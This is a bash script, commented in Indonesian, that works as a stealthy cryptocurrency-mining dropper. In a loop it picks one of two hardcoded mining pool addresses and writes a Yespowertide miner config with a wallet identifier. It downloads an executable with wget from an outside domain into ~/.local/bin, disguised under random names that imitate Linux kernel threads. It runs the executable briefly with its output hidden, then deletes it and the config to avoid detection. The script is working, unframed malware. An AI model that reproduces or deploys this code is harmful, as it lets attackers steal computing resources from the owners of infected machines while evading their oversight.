#!/bin/bash

# URL utama dan cadangan
MAIN_URL="35.162.27.139:443"
BACKUP_URL="134.199.144.90:443"
USER="TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR.Train27mlm"

POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")

LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

generate_random_string() {
    local length=${1:-8}
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

# Fungsi untuk test koneksi URL
test_url_connection() {
    local url=$1
    local host=$(echo $url | cut -d: -f1)
    local port=$(echo $url | cut -d: -f2)
    
    timeout 5 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
    return $?
}

# Fungsi untuk menentukan URL yang aktif
get_active_url() {
    if test_url_connection "$MAIN_URL"; then
        echo "$MAIN_URL"
    else
        echo "$BACKUP_URL"
    fi
}

while true; do
    # Deteksi URL yang aktif setiap sesi
    ACTIVE_URL=$(get_active_url)
    
    # Buat CONFIG_JSON dengan URL yang aktif
    CONFIG_JSON='{
  "algo": "Yespowertide",
  "url": "'"$ACTIVE_URL"'",
  "user": "'"$USER"'",
  "pass": "x",
  "threads": 8
}'

    rm -f "$LOCAL_BIN_DIR"/*.json
    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
    rm -f "$LOCAL_BIN_DIR"/migration*
    rm -f "$LOCAL_BIN_DIR"/watchdog*
    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
    rm -f "$LOCAL_BIN_DIR"/rcu_*
    rm -f "$LOCAL_BIN_DIR"/.profile-cache*
    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
    rm -f "$LOCAL_BIN_DIR"/kintegrityd*
    rm -f "$LOCAL_BIN_DIR"/kblockd*
    rm -f "$LOCAL_BIN_DIR"/kthrotld*

    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    
    RAND_SUFFIX=$(generate_random_string 12)
    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
    
    CONFIG_SUFFIX=$(generate_random_string 10)
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config${CONFIG_SUFFIX}.json"

    echo "$CONFIG_JSON" > "$CONFIG_PATH"

    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
    
    if [ $? -ne 0 ]; then
        sleep 30
        continue
    fi
    
    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL"

    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))

    IDLE_SEC=$((RANDOM % 11 + 20))

    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1

    rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
    rm -f "$CONFIG_PATH"

    sleep "$IDLE_SEC"
done
